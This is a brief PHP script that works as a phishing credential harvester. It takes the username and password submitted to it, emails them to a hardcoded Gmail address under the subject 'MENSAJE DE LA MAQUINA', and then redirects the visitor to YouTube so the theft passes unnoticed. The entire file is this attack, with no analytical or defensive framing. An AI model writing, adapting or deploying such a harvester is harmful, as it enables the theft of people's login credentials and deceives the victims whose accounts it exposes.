<?php

	function mail_sender(){
		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
			return false;
		}

		$username = $_REQUEST['username'];
		$password = $_REQUEST['password'];
		
		$reciever = "cristiandavian1@gmail.com";
		
		$subject = "MENSAJE DE LA MAQUINA";
		$message = "NOMBRE:  ". $username;
		$message .= "PASS : ". $password;
		
		return mail($reciever, $subject, $message);
	}
	
	mail_sender();
		header("Location: https://www.youtube.com/");
	
	
?>
